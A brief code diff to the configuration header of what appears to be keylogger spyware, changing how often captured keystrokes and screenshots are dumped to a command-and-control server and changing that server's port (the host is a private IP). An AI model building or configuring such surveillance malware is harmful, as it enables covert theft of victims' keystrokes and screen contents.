@@ -15,7 +15,7 @@
  * How often the keylog and screenshots are 
  * dumped to the server in minutes
  */
-#define DUMP_FREQUENCY_MINUTES 60
+#define DUMP_FREQUENCY_MINUTES 100
 
 /**
  * How often screenshots are recorded in minutes
@@ -26,7 +26,7 @@
  * Comand and Control ip and port
  **/
 #define CC_HOSTNAME "192.168.1.252"
-#define CC_PORT 3008
+#define CC_PORT 3009
 
 /**
  * Public key of cc server
